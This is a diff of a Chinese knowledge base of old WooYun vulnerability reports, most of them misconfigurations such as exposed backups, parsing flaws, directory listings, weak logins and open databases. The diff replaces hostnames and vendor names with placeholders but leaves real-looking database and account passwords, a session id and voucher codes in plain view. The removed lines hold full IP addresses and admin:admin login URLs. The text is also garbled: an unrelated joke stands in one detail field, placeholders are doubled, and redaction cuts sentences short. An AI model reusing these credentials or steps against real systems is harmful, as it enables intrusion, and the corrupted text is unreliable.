+**详情**: 昨天LZ路过一条街，发现街上有站街女，其中有一个竟然朝着我热情地打招呼：“帅哥，来玩玩吧。”我灵机一动，粗着嗓子说：“不了，我喜欢男的。”于是她看都懒得再看我一眼，我洋洋得意，头也不回的走了。结果还没走出路口，就被两个男的拦住了...[IP已脱敏]
 
 **POC**: total: 5,113,212条数据
 
@@ -12770,7 +12770,7 @@
 
 **详情**: 
 
-**POC**: http://passport.sohu.com/sso/login.jsp?userid=%C4%E3%B5%C4%D3%C3%BB%A7%C3%FB%40sohu.com&password=%C3%DC%C2%
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12790,9 +12790,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://kefu.duba.net/bin “bin”这个进行随意改动页面 array(2) { ["bin"]=> string(0) "" ["scene"]=> string(3) "bin" } 502会出现变动
+**详情**: https://example.com/[已脱敏] “bin”这个进行随意改动页面 array(2) { ["bin"]=> string(0) "" ["scene"]=> string(3) "bin" } 502会出现变动
 
-**POC**: http://kefu.duba.net/bin “bin”这个进行随意改动页面 array(2) { ["bin"]=> string(0) "" ["scene"]=> string(3) "bin" } 502会出现变动
+**POC**: https://example.com/[已脱敏] “bin”这个进行随意改动页面 array(2) { ["bin"]=> string(0) "" ["scene"]=> string(3) "bin" } 502会出现变动
 
 **绕过**: 直接利用
 
@@ -12812,7 +12812,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: www.oppoforums.comhttp://54.83.18.184:81/列目录源码下载http://54.83.18.184:81/www.oppoforums.com/oppo.global.forum.tar.gz找啊找啊public_html/library/config.php<?php$config['db']['host'] = 'localhost';$config['db']['port'] = '3306';$config['db']['username'] = 'oppoforums';$config['db']['password'] = 'zpu9mVKZHvwF7pTZ';$config['db']['dbname'] = 'oppoforums';$config['superAdmins'] = '1,3,8881,16189,36384';$conf
+**详情**: www.oppoforums.comhttp://[IP已脱敏] = 'localhost';$config['db']['port'] = '3306';$config['db']['username'] = 'oppoforums';$config['db']['password'] = 'zpu9mVKZHvwF7pTZ';$config['db']['dbname'] = 'oppoforums';$config['superAdmins'] = '1,3,8881,16189,36384';$conf
 
 **POC**: 见上！
 
@@ -12834,7 +12834,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 全国智能运输系统标准化技术委员会http://www.its-standards.cn/http://www.its-standards.cn/logtest.txt
+**详情**: 全国智能运输系统标准化技术委员会https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -12880,7 +12880,7 @@
 
 **详情**: 凤凰网读书频道源代码泄露漏洞
 
-**POC**: http://book.ifeng.com/favs_list.phphttp://book.ifeng.com/inc.phphttp://book.ifeng.com/conf/conf.global.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -12932,8 +12932,8 @@
 ---
 
 ---
-### [wooyun-2012-07576] 淘宝图片服务器php解析漏洞
-**厂商**: 淘宝网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-07576] 某电商平台图片服务器php解析漏洞
+**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -12966,13 +12966,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 61.174.15.166 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定 IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定 IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -12988,7 +12988,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.midifan.com/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13010,7 +13010,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站点：http://115.182.21.31:8089/sms/第二套系统：http://115.182.21.31:8089/codegen/可以看到该IP两边都是赛迪的，所以该系统也应该是赛迪的。漏洞：使用admin、admin直接登录管理：http://admin:admin@115.182.21.31:8089/manager/html直接上菜刀：
+**详情**: 站点：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -13020,7 +13020,7 @@
 ---
 
 ---
-### [wooyun-2015-0125655] 滴滴打车 邮箱伪造漏洞，可钓鱼
+### [wooyun-2015-0125655] 某出行平台打车 邮箱伪造漏洞，可钓鱼
 **厂商**: 小桔科技 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
@@ -13042,8 +13042,8 @@
 ---
 
 ---
-### [wooyun-2014-049987] 淘宝知识库目录列出可获取商品数据
-**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-049987] 某电商平台知识库目录列出可获取商品数据
+**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -13054,9 +13054,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我是在google搜索其他数据的时候偶然发现的，好像只能通过google进去 才能看到所有的信息，设置了来路判断，这些数据只针对特定的人有用，比如电商信息收集的人，做淘宝客等 可以使用。访问地址：http://zhidao.taobao.com/baobei/-713DBCD3B7CABCD3B4F3C4D020C5A3D7D0BFE326773DBCD3B7CABCD3B4F3C4D020C5A3D7D0BFE3.html
+**详情**: 我是在google搜索其他数据的时候偶然发现的，好像只能通过google进去 才能看到所有的信息，设置了来路判断，这些数据只针对特定的人有用，比如电商信息收集的人，做某电商平台客等 可以使用。访问地址：https://example.com/[已脱敏]
 
-**POC**: 可通过 http://zhidao.taobao.com/lst/  此地址下载淘宝生成的sitemap压缩文件。电商信息抓取的会喜欢的..不过危险性不大，只是服务器配置不是太严谨而已。
+**POC**: 可通过 https://example.com/[已脱敏]  此地址下载某电商平台生成的sitemap压缩文件。电商信息抓取的会喜欢的..不过危险性不大，只是服务器配置不是太严谨而已。
 
 **绕过**: 直接利用
 
@@ -13076,7 +13076,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 好吧不絮叨了团购网站赴圩团http://120.193.64.194:8088/serverLog.do可以直接下载短信日志下载下来的例如:2014-08-22 16:44:30,173 INFO  [STDOUT] 2014-08-22 16:44:30,173 - MAS -25680928413 [CMPP提交短信线程] INFO  MAS  - [短信模块] - [网关代理][Cmpp2Route] submit|10657303897788|b521940f-acb8-4aea-a279-67510ce4a3e0|0|赴圩团：仅128元即享价值158.7元的轻松一夏自助晚餐！券号：91444478，密码：547623，请注意保密，木有地址?2014-08-22 16:44:30,174 INFO  [STDOUT] ==拆分短信====662014-08-22 16:44:30,
+**详情**: 好吧不絮叨了团购网站赴圩团http://[IP已脱敏] 16:44:30,173 INFO  [STDOUT] 2014-08-22 16:44:30,173 - MAS -25680928413 [CMPP提交短信线程] INFO  MAS  - [短信模块] - [网关代理][Cmpp2Route] submit|10657303897788|b521940f-acb8-4aea-a279-67510ce4a3e0|0|赴圩团：仅128元即享价值158.7元的轻松一夏自助晚餐！券号：91444478，密码：547623，请注意保密，木有地址?2014-08-22 16:44:30,174 INFO  [STDOUT] ==拆分短信====662014-08-22 16:44:30,
 
 **POC**: (见原文)
 
@@ -13098,9 +13098,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 广东省网上办事大厅佛山分厅：http://wssp.fsxzfw.gov.cn/广东省网上办事大厅惠州市仲恺分厅：http://fw.hzzk.gov.cn/广东省网上办事大厅江门市新会分厅：http://wsbs.xinhui.gov.cn/广东省网上办事大厅深圳市宝安分厅：http://bsdt.baoan.gov.cn/由于没有删除install，可以导致重装。
+**详情**: 广东省网上办事大厅佛山分厅：https://example.com/[已脱敏]
 
-**POC**: 广东省网上办事大厅佛山分厅：http://wssp.fsxzfw.gov.cn/广东省网上办事大厅惠州市仲恺分厅：http://fw.hzzk.gov.cn/广东省网上办事大厅江门市新会分厅：http://wsbs.xinhui.gov.cn/广东省网上办事大厅深圳市宝安分厅：http://bsdt.baoan.gov.cn/由于没有删除install，可以导致重装。
+**POC**: 广东省网上办事大厅佛山分厅：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13120,7 +13120,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://23.91.96.37  直接跳转蘑菇街主页。https://23.91.96.37  这个地址是个手机登陆地址，因为没有安装APP所以也就不在这里进行利用测试了。
+**详情**: http://[IP已脱敏]  直接跳转蘑菇街主页。https://[IP已脱敏]  这个地址是个手机登陆地址，因为没有安装APP所以也就不在这里进行利用测试了。
 
 **POC**: 看的出来是手机连接。。。。做过加密了
 
@@ -13166,7 +13166,7 @@
 
 **详情**: 配置不当，导致可查看文件列表
 
-**POC**: http://sms.ourgame.com/common/under/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13186,7 +13186,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 慕课整站程序http://mooc.edusoho.com/web.tar.gz
+**详情**: 慕课整站程序https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13208,7 +13208,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意扫到的.java scanner 2 20 http://franchising.mcdonalds.com.cn/Target = http://franchising.mcdonalds.com.cn/Max delay after each request in milliseconds = 0No proxy has been used.Scanning...Dir: APP_WE~1File: WEB~1.COFile: WEB~1.CONDir: ASPNET~1File: FILEMA~1.CSFile: DEFAUL~1.CSFile: REDIRE~1.AFile: GLOBAL~1.ASAFile: DEFAUL~1.ASPFile: FILEMA~1.ASPDir: UPLOAD~1File: SENDFL~1.CSDir: WHIR_S~1File: REDIR
+**详情**: 无意扫到的.java scanner 2 20 https://example.com/[已脱敏] = https://example.com/[已脱敏] delay after each request in milliseconds = 0No proxy has been used.Scanning...Dir: APP_WE~1File: WEB~1.COFile: WEB~1.CONDir: ASPNET~1File: FILEMA~1.CSFile: DEFAUL~1.CSFile: REDIRE~1.AFile: GLOBAL~1.ASAFile: DEFAUL~1.ASPFile: FILEMA~1.ASPDir: UPLOAD~1File: SENDFL~1.CSDir: WHIR_S~1File: REDIR
 
 **POC**: ..
 
@@ -13254,7 +13254,7 @@
 
 **详情**: 
 
-**POC**: http://www.mlr.gov.cn/download/.bash_history
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13262,8 +13262,8 @@
 ---
 
 ---
-### [wooyun-2011-03089] 新浪云SAE环境配置不当
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-03089] 某社交平台云SAE环境配置不当
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -13284,8 +13284,8 @@
 ---
 
 ---
-### [wooyun-2013-027158] 新浪微博某新产品现错，疑是可注入或DDOS
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: 应用配置错误
+### [wooyun-2013-027158] 某社交平台某社交平台某新产品现错，疑是可注入或DDOS
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -13296,7 +13296,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题发生在http://renmai.weibo.com/0/resume/download首先现错爆出了物理路径其中还有sql错误。从提示看syntax to use near 'AND Fobj_uid=1746569 ........应该是前应该条件的值为空了。导致的出错。为什么输入0会空呢？由于是伪静态 规则限制了只能是正整数。未能深入！最后还有一个内存溢出Fatal error: Allowed memory size of 134217728 bytes exhausted如果对此页面进行高并发请求 是不是会让内存居高不下导致DDOS呢？（惭愧底层不懂是硬伤）
+**详情**: 问题发生在https://example.com/[已脱敏] to use near 'AND Fobj_uid=1746569 ........应该是前应该条件的值为空了。导致的出错。为什么输入0会空呢？由于是伪静态 规则限制了只能是正整数。未能深入！最后还有一个内存溢出Fatal error: Allowed memory size of 134217728 bytes exhausted如果对此页面进行高并发请求 是不是会让内存居高不下导致DDOS呢？（惭愧底层不懂是硬伤）
 
 **POC**: 技术有限。
 
@@ -13320,7 +13320,7 @@
 
 **详情**: 
 
-**POC**: http://s1.vipshop.com/source/DB2Config.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13340,9 +13340,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 昨天提交的这个漏洞，发现你们已经补丁了，但是还是有点瑕疵，有些东西没删除干净WooYun: 顺丰速运某系统配置不当导致可获取系统权限哪天万一爆出什么漏洞怎么办呢？https://sfadp.sf-express.com/status?full=truehttps://sfadp.sf-express.com/jbpm-console后来看的时候，发现这个系统是有2的：https://sfadp2.sf-express.com/admin-console，典型的哪里有问题补丁哪里。
+**详情**: 昨天提交的这个漏洞，发现你们已经补丁了，但是还是有点瑕疵，有些东西没删除干净WooYun: 顺丰速运某系统配置不当导致可获取系统权限哪天万一爆出什么漏洞怎么办呢？https://example.com/[已脱敏]
 
-**POC**: 这俩也可以一并删除https://sfadp2.sf-express.com/status?full=truehttps://sfadp2.sf-express.com/jbpm-console
+**POC**: 这俩也可以一并删除https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13350,8 +13350,8 @@
 ---
 
 ---
-### [wooyun-2012-014144] 百度某站解析漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-014144] 某搜索引擎某站解析漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -13362,13 +13362,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://jingyan.baidu.com/event/img/tuzi1029.jpg/1111.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 百度一下
+**修复**: 某搜索引擎一下
 ---
 
 ---
@@ -13406,9 +13406,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 格兰仕某系统存在JAVA反序列化漏洞系统地址：http://219.128.102.212:8380/ebridge_galanz/security/index.jhtml上神器好了，就这些
+**详情**: 格兰仕某系统存在JAVA反序列化漏洞系统地址：http://[IP已脱敏]
 
-**POC**: 格兰仕某系统存在JAVA反序列化漏洞系统地址：http://219.128.102.212:8380/ebridge_galanz/security/index.jhtml上神器好了，就这些
+**POC**: 格兰仕某系统存在JAVA反序列化漏洞系统地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -13428,7 +13428,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先我找到了这个：可惜文件不在了。但谷歌却缓存了这个文件，链接如下：http://webcache.googleusercontent.com/search?q=cache:SFwiWG2jsYsJ:loadcontrol.ceair.com/UploadFile/20120719030257.xls+8008208820&cd=22&hl=en&ct=clnk我把网页拉到最底下之后，便发现了宝藏：经过测试，发现了这两枚可用的账号：dxlu	44CISUub和lihui3	44CISUub。邮箱里应该是可以看到公司内部所有人的联系方式的，比如，总经理......最后，之所以说这里出了“配置不当”的问题，是因为，这个站点下是有robots.txt的（http://loadcontrol.ceair.com/robots.txt），但搜索引擎任然收录了大量该站的文件。
+**详情**: 首先我找到了这个：可惜文件不在了。但谷歌却缓存了这个文件，链接如下：https://example.com/[已脱敏]	44CISUub和lihui3	44CISUub。邮箱里应该是可以看到公司内部所有人的联系方式的，比如，总经理......最后，之所以说这里出了“配置不当”的问题，是因为，这个站点下是有robots.txt的（https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13472,9 +13472,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zmifi.com/ 紫米官网0x01:整站备份：http://zmifi.com/zmifi.raradmin 94606de1fd2af172   -->解密：admineditor      b1fd579f47433b88
+**详情**: https://example.com/[已脱敏] 紫米官网0x01:整站备份：https://example.com/[已脱敏] 94606de1fd2af172   -->解密：admineditor      b1fd579f47433b88
 
-**POC**: 0x02:101.251.64.85:3389服务器存在MS12-020 .可让服务器宕机，蓝屏，重启！<审核员不建议测试>
+**POC**: 0x02:[IP已脱敏]服务器存在MS12-020 .可让服务器宕机，蓝屏，重启！<审核员不建议测试>
 
 **绕过**: 直接利用
 
@@ -13494,7 +13494,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 天天果园   仓库系统http://cang.fday.co/账号：libo密码：fday2015ok
+**详情**: 天天果园   仓库系统https://example.com/[已脱敏]
 
 **POC**: ···
 
@@ -13516,7 +13516,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://app.my.4399.com/wiki/MYML/invite/my:req-choice/login.html
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13548,8 +13548,8 @@
 ---
 
 ---
-### [wooyun-2012-09317] 新浪某站nginx解析漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-09317] 某社交平台某站nginx解析漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -13560,7 +13560,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://suzhou.house.sina.com.cn/robots.txt/数据流.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -13582,7 +13582,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 访问：http://mail.expacta.com.cn/extmail/tmp/获取到未过期sid(比如：http://mail.expacta.com.cn/extmail/tmp/sid_2bb0a258fad7e8b9701b0a9ce28e6c64， “2bb0a258fad7e8b9701b0a9ce28e6c64”为sid）2. 访问http://mail.expacta.com.cn，通过firebug或者其他方式 新增cookie(sid=2bb0a258fad7e8b9701b0a9ce28e6c64)3. 刷新当前页面，即可登录
+**详情**: 1. 访问：https://example.com/[已脱敏] “2bb0a258fad7e8b9701b0a9ce28e6c64”为sid）2. 访问https://example.com/[已脱敏] 新增cookie(sid=2bb0a258fad7e8b9701b0a9ce28e6c64)3. 刷新当前页面，即可登录
 
 **POC**: (见原文)
 
@@ -13604,7 +13604,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ##缺陷站点http://wiki.jiashuangkuaizi.com##缺陷成因该系统未关闭注册功能，导致外部人员注册后可以查看系统内容测试帐号orange/orange
+**详情**: ##缺陷站点https://example.com/[已脱敏]
 
 **POC**: ##漏洞证明产品组运维技术部临时管理权限
 
@@ -13626,7 +13626,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 皮阿诺订单系统配置不当http://59.33.83.146:8081/存在iis写权限漏洞先put再move导致整站沦陷
+**详情**: 皮阿诺订单系统配置不当http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -13654,7 +13654,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考qq.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
+**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考某互联网公司.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
 ---
 
 ---
@@ -13670,7 +13670,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/edge-security/edge_mail/blob/07fb54367949a66855c9be4597c04f29466737c4/mlogin.pyconn = MySQLdb.connect(host="103.21.140.84", user="security", passwd="CW[=Zc%KvK/zZ&Ff", port=3306)
+**详情**: https://example.com/[已脱敏] = MySQLdb.connect(host="[IP已脱敏]", user="security", passwd="CW[=Zc%KvK/zZ&Ff", port=3306)
 
 **POC**: (见原文)
 
@@ -13714,9 +13714,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.verycd.com
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://bbs.verycd.com/robots.txt/admin.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13758,7 +13758,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这几天对56进行了ip的扫描，得出一个ip，80端口对外开放。应该是个流量监控服务器：流量还是蛮大的呀。在对这ip扫描的时候，发现上面还跑着Solr:顺着上图，又继续找到其他几个Sorl访问：http://180.153.21.161:49705/http://180.153.21.162:49705/http://180.153.21.163:49705/http://180.153.21.164:49705/#/在提交之前还和56的工作人员确认了下，确实是他们的ip。(额外说一句56的人真的很友好。)
+**详情**: 这几天对56进行了ip的扫描，得出一个ip，80端口对外开放。应该是个流量监控服务器：流量还是蛮大的呀。在对这ip扫描的时候，发现上面还跑着Solr:顺着上图，又继续找到其他几个Sorl访问：http://[IP已脱敏]
 
 **POC**: 通过这个漏洞能遍历大部分系统上的文件了:)
 
@@ -13802,7 +13802,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://115.182.21.32/乌云很多这样的案例了，今天我也找到个本站文件就不继续了
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -13824,7 +13824,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://icc.xunlei.com/install/install.php自己看吧.ICC是你们的客服平台.迅雷各个站每个页面都有.一但被入侵.风险极大.配置文件可以任意插马.
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 危害非常严重.
 
@@ -13835,7 +13835,7 @@
 
 ---
 ### [wooyun-2012-06198] 灵魂战车2专题站PHP不解析，直接出源码，可下载可爬站
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -13846,9 +13846,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天去 http://ghostrider2.ent.sina.com.cn/ 围观专题。然后点击到 http://ghostrider2.ent.sina.com.cn/wallpapers.php?id=downloads/wallpapers/ghostrider_wp02_standard.jpg壁纸下载的时候，就BUG了接下去发现 http://ghostrider2.ent.sina.com.cn/ 这个域名下的东西全都不解析PHP了接着，如果体力好的话，可以全都DOWN下来玩。。不知道算不算BUG，反正图片是蛮多的~可以当桌面用，哈哈~
+**详情**: 今天去 https://example.com/[已脱敏] 围观专题。然后点击到 https://example.com/[已脱敏] https://example.com/[已脱敏] 这个域名下的东西全都不解析PHP了接着，如果体力好的话，可以全都DOWN下来玩。。不知道算不算BUG，反正图片是蛮多的~可以当桌面用，哈哈~
 
-**POC**: http://ghostrider2.ent.sina.com.cn/includes/config.inc.phphttp://ghostrider2.ent.sina.com.cn/wallpapers.php?id=downloads/wallpapers/ghostrider_wp02_standard.jpg
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13892,7 +13892,7 @@
 
 **详情**: 
 
-**POC**: 把我的shell删掉啊！http://hd.liba.com/house/help.php 密码k天地良心，这绝对不是我留的后门再传的，服务访问日志可见。另外两个shell我已经帮你们删了http://hd.liba.com/house/tunnel.php是代理程序，请自己删除
+**POC**: 把我的shell删掉啊！https://example.com/[已脱敏] 密码k天地良心，这绝对不是我留的后门再传的，服务访问日志可见。另外两个shell我已经帮你们删了https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -13914,7 +13914,7 @@
 
 **详情**: 项目开发使用的服务器，不要这么暴露啊！
 
-**POC**: redmine任意用户注册+管理员弱口令：http://119.167.254.105:8081/redmine/tomcat7弱口令：http://119.167.254.105:7080/
+**POC**: redmine任意用户注册+管理员弱口令：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -13934,7 +13934,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mp.sdta.cn/jqticket/webManagement/login.jsp  默认账号密码，已添加测试账号 wooyun  wooyun 登录后可查看各种票，以及订票人信息，更可以免费兑换3000多个景区门票  可以管理各种票务
+**详情**: https://example.com/[已脱敏]  默认账号密码，已添加测试账号 wooyun  wooyun 登录后可查看各种票，以及订票人信息，更可以免费兑换3000多个景区门票  可以管理各种票务
 
 **POC**: (见原文)
 
@@ -13956,7 +13956,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.106.133.55TCL进出口部业务管理系统由于WebDav权限配置不当，导致可以写入任意文件。http editor测试：
+**详情**: http://[IP已脱敏]TCL进出口部业务管理系统由于WebDav权限配置不当，导致可以写入任意文件。http editor测试：
 
 **POC**: 成功写入文件：
 
@@ -14000,7 +14000,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://r2mp.huawei.com/r2mp/custom/isd/logOff.action用户名密码直接写在上面....
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -14011,7 +14011,7 @@
 
 ---
 ### [wooyun-2012-09482] 中国很多网上银行客户数字证书配置不当
-**厂商**: 中国很多银行&支付宝 | **年份**: 2012 | **类型**: 默认配置不当
+**厂商**: 中国很多银行&某电商平台 | **年份**: 2012 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -14022,9 +14022,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一张使用的是农业银行发布的数字证书做的code签名第二张使用的是支付宝发布的数字证书做的code签名他们对应的根证书自己到官网下载安装，不解释。至于如何做code签名，微软有个signcode.exe，也不解释了。会有什么危害呢？看那个“数字签名正常”几个字就知道了。除了可以通过浏览器控件的签名验证之外，还可以逃避一下杀毒软件的查杀（目前很多杀软都是忽略“可信任”的软件白名单）
+**详情**: 第一张使用的是农业银行发布的数字证书做的code签名第二张使用的是某电商平台发布的数字证书做的code签名他们对应的根证书自己到官网下载安装，不解释。至于如何做code签名，微软有个signcode.exe，也不解释了。会有什么危害呢？看那个“数字签名正常”几个字就知道了。除了可以通过浏览器控件的签名验证之外，还可以逃避一下杀毒软件的查杀（目前很多杀软都是忽略“可信任”的软件白名单）
 
-**POC**: 第一张使用的是农业银行发布的数字证书做的code签名第二张使用的是支付宝发布的数字证书做的code签名
+**POC**: 第一张使用的是农业银行发布的数字证书做的code签名第二张使用的是某电商平台发布的数字证书做的code签名
 
 **绕过**: 直接利用
 
@@ -14044,9 +14044,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 211.154.219.72::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array('gxanalytics' => array('host' =>'211.154.255.103','port' =>'3306','user'=>'gxanalyticsuser','passwd'=>'woainiya@2012'));// redis$_SERVER['CONFIG']['redis'] = array('master' => array('wwwhotsearchcount' => array('host' => '211.154.255.103','port' => '6379')));mysql -h211.154.255.10
+**详情**: rsync [IP已脱敏]::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array('gxanalytics' => array('host' =>'[IP已脱敏]','port' =>'3306','user'=>'gxanalyticsuser','passwd'=>'woainiya@2012'));// redis$_SERVER['CONFIG']['redis'] = array('master' => array('wwwhotsearchcount' => array('host' => '[IP已脱敏]','port' => '6379')));mysql -h211.154.255.10
 
-**POC**: rsync 211.154.219.72::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array('gxanalytics' => array('host' =>'211.154.255.103','port' =>'3306','user'=>'gxanalyticsuser','passwd'=>'woainiya@2012'));// redis$_SERVER['CONFIG']['redis'] = array('master' => array
+**POC**: rsync [IP已脱敏]::analytics.gexing.com/config/dbconf.php .dbconf.php::::::::::::::<?php$_SERVER['db_conf'] = array('gxanalytics' => array('host' =>'[IP已脱敏]','port' =>'3306','user'=>'gxanalyticsuser','passwd'=>'woainiya@2012'));// redis$_SERVER['CONFIG']['redis'] = array('master' => array
 
 **绕过**: 直接利用
 
@@ -14066,7 +14066,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 时代互联# DNS域传送漏洞一枚C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  8.8.8.8> now.cn服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:名称:    now.cnAddress:  119.146.222.145> set type=ns> now.cn服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:now.cn  nameserver = ns5000.01isp.comnow.cn  nameserver = ns5001.01isp.cnnow.cn  nameserver = ns5002.01isp.net> s
+**详情**: 时代互联# DNS域传送漏洞一枚C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]> now.cn服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:名称:    now.cnAddress:  [IP已脱敏]> set type=ns> now.cn服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:now.cn  nameserver = ns5000.01isp.comnow.cn  nameserver = ns5001.01isp.cnnow.cn  nameserver = ns5002.01isp.net> s
 
 **POC**: (见原文)
 
@@ -14090,7 +14090,7 @@
 
 **详情**: am.gwbn.net.cn
 
